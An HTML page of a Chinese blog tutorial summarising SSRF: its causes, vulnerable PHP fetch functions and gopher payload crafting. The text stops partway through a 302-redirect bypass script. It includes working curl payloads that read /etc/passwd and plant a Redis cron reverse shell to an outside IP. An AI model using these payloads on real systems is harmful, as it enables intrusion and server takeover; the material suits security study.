<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>ssrf总结 - 追风少年的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="ssrf总结" />
<meta property="og:description" content="SSRF总结 简介 服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。
原理 SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如,黑客操作服务端从指定URL地址获取网页文本内容,加载指定地址的图片等,利用的是服务端的请求伪造,SSRF利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。
危害 对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。对内网Web应用进行指纹识别，识别企业内部的资产信息。攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。使用特定协议攻击应用（gopher、dict、file、FTP/SFTP等）进行跳板攻击等。 容易出现漏洞的地方 分享 通过url 地址分享文章，例如如下地址：
http://share.xxx.com/index.php?url=http://127.0.0.1 通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。
图片加载与下载 通过URL地址加载或下载图片
http://image.xxx.com/image.php?image=http://127.0.0.1 图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。
图片、文章收藏功能 http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de 例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。
利用参数中的关键字来查找 sharewapurllinksrcsourcetargetu3gdisplaysourceURlimageURLdomain 产生漏洞的函数 下面是几个可能会存在SSRF的服务器使用的函数：
file_get_contents() 这个函数的作用是将整个文件读入一个字符串。
example:
&lt;?php $url = $_GET[&#39;url&#39;]; $homepage = file_get_contents($url); echo $homepage; ?&gt; 上述测试代码中，file_get_contents() 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户。我们构造类似 ssrf.php?url=../../../../../etc/passwd 的paylaod即可读取服务器本地的任意文件。
fsockopen() fsockopen($hostname,$port,$errno,$errstr,$timeout); 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。
example：
&lt;?php $host=$_GET[&#39;url&#39;]; $fp = fsockopen($host, 80, $errno, $errstr, 30); if (!$fp) { echo &#34;$errstr ($errno)&lt;br /&gt;\n&#34;; } else { $out = &#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://zhuifengsn.github.io/posts/f5a6cb750b5d55df7525942e5a8aa46d/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-05-01T20:38:19+08:00" />
<meta property="article:modified_time" content="2022-05-01T20:38:19+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="追风少年的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">追风少年的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">ssrf总结</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="SSRF_0"></a>SSRF总结</h2> 
<h3><a id="_2"></a>简介</h3> 
<p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以<strong>服务器的身份</strong>发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的<strong>内部系统</strong>。SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p> 
<h3><a id="_6"></a>原理</h3> 
<p>SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如,黑客操作服务端从指定URL地址获取网页文本内容,加载指定地址的图片等,利用的是服务端的请求伪造,SSRF利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。</p> 
<p><img src="https://images2.imgbox.com/97/b9/Ev3B8Nx6_o.png" alt="img"></p> 
<h3><a id="_12"></a>危害</h3> 
<ul><li>对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。</li><li>使用特定协议攻击应用（gopher、dict、file、FTP/SFTP等）</li><li>进行跳板攻击等。</li></ul> 
<h3><a id="_20"></a>容易出现漏洞的地方</h3> 
<h4><a id="_22"></a>分享</h4> 
<p>通过url 地址分享文章，例如如下地址：</p> 
<pre><code>http://share.xxx.com/index.php?url=http://127.0.0.1
</code></pre> 
<p>通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</p> 
<h4><a id="_32"></a>图片加载与下载</h4> 
<p>通过URL地址加载或下载图片</p> 
<pre><code>http://image.xxx.com/image.php?image=http://127.0.0.1
</code></pre> 
<p>图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。</p> 
<h4><a id="_42"></a>图片、文章收藏功能</h4> 
<pre><code>http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de
</code></pre> 
<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p> 
<h4><a id="_50"></a>利用参数中的关键字来查找</h4> 
<ul><li>share</li><li>wap</li><li>url</li><li>link</li><li>src</li><li>source</li><li>target</li><li>u</li><li>3g</li><li>display</li><li>sourceURl</li><li>imageURL</li><li>domain</li></ul> 
<h3><a id="_66"></a>产生漏洞的函数</h3> 
<p>下面是几个可能会存在SSRF的服务器使用的函数：</p> 
<h4><a id="file_get_contents_70"></a>file_get_contents()</h4> 
<p>这个函数的作用是将整个文件读入一个字符串。</p> 
<p>example:</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$homepage</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$homepage</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>上述测试代码中，<code>file_get_contents()</code> 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户。我们构造类似 <code>ssrf.php?url=../../../../../etc/passwd</code> 的paylaod即可读取服务器本地的任意文件。</p> 
<h4><a id="fsockopen_86"></a>fsockopen()</h4> 
<pre><code>fsockopen($hostname,$port,$errno,$errstr,$timeout);
</code></pre> 
<p>用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。<code>fsockopen()</code>将返回一个文件句柄，之后可以被其他文件类函数调用（例如：<code>fgets()</code>，<code>fgetss()</code>，<code>fwrite()</code>，<code>fclose()</code>还有<code>feof()</code>）。如果调用失败，将返回false。</p> 
<p>example：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)&lt;br /&gt;\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"GET / HTTP/1.1\r\n"</span><span class="token punctuation">;</span>
    <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"Host: <span class="token interpolation"><span class="token variable">$host</span></span>\r\n"</span><span class="token punctuation">;</span>
    <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"Connection: Close\r\n\r\n"</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<h4><a id="curl_exec_115"></a>curl_exec()</h4> 
<p>改函数初始化一个新的会话，返回一个cURL句柄，供<code>curlsetopt()</code>，<code>curlexec()</code>和<code>curlclose()</code> 函数使用。</p> 
<p>example:</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建新的 cURL 资源</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置 URL 和相应的选项</span>
    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 抓取 URL 并把它传递给浏览器</span>
    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 关闭 cURL 资源，并且释放系统资源</span>
 
    <span class="token comment">// $filename = './curled/'.rand().'.txt';</span>
    <span class="token comment">// file_put_contents($filename, $result); </span>
    <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<h3><a id="_139"></a>常用协议介绍</h3> 
<h4><a id="file_141"></a>file</h4> 
<p>file协议主要用于访问本地计算机的文件，就如同windows资源管理器中打开文件一样，在有回显的情况下，可以用于读取文件进行查看。</p> 
<p>example:</p> 
<pre><code>file:///etc/passwd
</code></pre> 
<h5><a id="https_151"></a>http/s</h5> 
<p>通常用http/s协议用于探测内网存活。一般是先想办法得到目标主机的网络配置信息，如读取<code>/etc/hosts</code>、<code>/proc/net/arp</code>、<code>/proc/net/fib_trie</code>等文件，从而获得目标主机的内网网段并进行爆破。</p> 
<p>example：(假设内网的IP为192.168.91.x)</p> 
<pre><code>http://192.168.91.1
</code></pre> 
<p>这里可以配合Burp对<code>192.168.91.1-255</code>进行爆破，根据返回结果长度的不同来判断ip是否存活。</p> 
<h4><a id="dict_163"></a>dict</h4> 
<p>词典网络协议可以用于探测或扫描内网端口在SSRF中发挥重要作用。</p> 
<pre><code>dict://127.0.0.1:8080/info
</code></pre> 
<h4><a id="gopher_171"></a>gopher</h4> 
<p>gopher是internet上一个非常有名的信息查找系统，你可以这么理解成可以和TCP进行一个发送数据包，因为我们SSRF漏洞语出web页面，所以我们可以有效地利用gopher协议进行加以利用其它程序漏洞来进行进一步的提权。</p> 
<h5><a id="Gopher_175"></a>Gopher协议格式</h5> 
<pre><code>URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流
</code></pre> 
<p>注意不要忘记后面那个下划线<code>_</code>，下划线<code>_</code>后面才开始接TCP数据流，如果不加这个<code>_</code>，那么服务端收到的消息将不是完整的，该字符可随意写。gopher的默认端口是70。</p> 
<p>gopher协议的转换规则如下：</p> 
<ul><li>如果第一个字符是<code>&gt;</code>或者<code>&lt;</code>那么丢弃该行字符串，表示请求和返回的时间。</li><li>如果前3个字符是<code>+OK</code> 那么丢弃该行字符串，表示返回的字符串。</li><li>问号（?）需要转码为URL编码，也就是<code>%3f</code></li><li>将<code>\r</code>字符串替换成<code>%0d%0a</code></li><li>空白行替换为<code>%0a</code></li></ul> 
<h5><a id="GopherHTTP_GET_191"></a>利用Gopher协议发送HTTP GET请求</h5> 
<p>先抓取或构造HTTP数据包，将数据包构造成符合gopher协议格式的请求。</p> 
<p>example：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello "</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"whoami"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>接下来我们构造payload。一个典型的GET型的HTTP包类似如下：</p> 
<pre><code>GET /echo.php?whoami=Bunny HTTP/1.1
Host: 192.168.91.194
</code></pre> 
<p>然后利用以下脚本进行一步生成符合Gopher协议格式的payload：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
payload <span class="token operator">=</span>
<span class="token triple-quoted-string string">"""GET /echo.php?whoami=Bunny HTTP/1.1
Host: 192.168.91.194
"""</span>  
<span class="token comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span>
tmp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
new <span class="token operator">=</span> tmp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span><span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>
result <span class="token operator">=</span> <span class="token string">'gopher://192.168.91.194:80/'</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">+</span>new
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre> 
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-ueigC1Cx-1651408634994)(https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210405200352264.png)]</p> 
<p><strong>注意这几个问题：</strong></p> 
<ol><li>问号（?）需要转码为URL编码，也就是%3f</li><li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li><li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li></ol> 
<p>然后执行：</p> 
<pre><code>curl gopher://192.168.91.149:80/_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%20192.168.91.149%0D%0A
</code></pre> 
<p><img src="https://images2.imgbox.com/f4/51/qwZlzuGl_o.png" alt="image-20210405200305064"></p> 
<h5><a id="GopherHTTP_POST_241"></a>利用Gopher协议发送HTTP POST请求</h5> 
<p>example:</p> 
<pre><code>&lt;?php
echo "Hello ".$_POST["whoami"]."\n"
?&gt;
</code></pre> 
<p>接下来我们构造payload。一个典型的POST型的HTTP包类似如下：</p> 
<pre><code>POST /echo.php HTTP/1.1
Host: 192.168.91.194
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
 
whoami=Bunny
</code></pre> 
<p><strong>注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串<code>whoami=Bunny</code>的长度。</strong></p> 
<p>最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议</p> 
<pre><code class="prism language-php">import urllib<span class="token operator">.</span>parse
payload <span class="token operator">=</span>\
<span class="token string double-quoted-string">""</span><span class="token string double-quoted-string">"POST /echo.php HTTP/1.1
Host: 192.168.91.194
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
 
whoami=Bunny
"</span><span class="token string double-quoted-string">""</span>  
<span class="token comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span>
tmp <span class="token operator">=</span> urllib<span class="token operator">.</span>parse<span class="token operator">.</span><span class="token function">quote</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">new</span> <span class="token operator">=</span> tmp<span class="token operator">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0A'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%0D%0A'</span><span class="token punctuation">)</span>
result <span class="token operator">=</span> <span class="token string single-quoted-string">'gopher://192.168.91.194:80/'</span><span class="token operator">+</span><span class="token string single-quoted-string">'_'</span><span class="token operator">+</span><span class="token keyword">new</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre> 
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-8XYyEQl5-1651408634998)(https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210405201201075.png)]</p> 
<p>然后执行：</p> 
<pre><code>curl gopher://192.168.91.194:80/_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%20192.168.91.194%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A
</code></pre> 
<p><img src="https://images2.imgbox.com/92/fd/8FJ8Imbx_o.png" alt="image-20210405202101363"></p> 
<h3><a id="_293"></a>漏洞利用</h3> 
<p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的绕过方式。</p> 
<h4><a id="_297"></a>本地利用</h4> 
<pre><code class="prism language-php"><span class="token comment"># dict protocol - 探测Redis</span>
curl <span class="token operator">-</span>v <span class="token string single-quoted-string">'dict://127.0.0.1:6379/info'</span>
 
<span class="token comment"># file protocol - 任意文件读取</span>
curl <span class="token operator">-</span>v <span class="token string single-quoted-string">'file:///etc/passwd'</span>
 
<span class="token comment"># gopher protocol - 一键反弹Bash</span>
<span class="token comment"># * 注意: 链接使用单引号，避免$变量问题</span>
curl <span class="token operator">-</span>v <span class="token string single-quoted-string">'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'</span>
</code></pre> 
<h4><a id="_311"></a>远程利用</h4> 
<h5><a id="ssrfphpSSRF_313"></a>漏洞代码ssrf.php（未做任何SSRF防御）</h5> 
<pre><code class="prism language-php"><span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>  
    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
 
<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h5><a id="_328"></a>远程利用方式</h5> 
<pre><code># 利用file协议任意文件读取
curl -v 'http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd'
 
# 利用dict协议查看端口
curl -v 'http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22'
 
# 利用gopher协议反弹shell
curl -v 'http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'
</code></pre> 
<h5><a id="ssrf2php_341"></a>漏洞代码ssrf2.php</h5> 
<ul><li>限制协议为HTTP、HTTPS</li><li>设置跳转重定向为True（默认不跳转）</li></ul> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token constant boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 限制为HTTPS、HTTP协议</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_PROTOCOLS</span><span class="token punctuation">,</span> <span class="token class-name">CURLPROTO_HTTP</span> <span class="token operator">|</span> <span class="token class-name">CURLPROTO_HTTPS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
 
<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<h5><a id="_364"></a>远程利用方式</h5> 
<p>当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL</p> 
<p>那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。</p> 
<p>我们继续构造一个302跳转服务，代码如下302.php:</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>  
<span class="token variable">$schema</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$ip</span>     <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$port</span>   <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>  
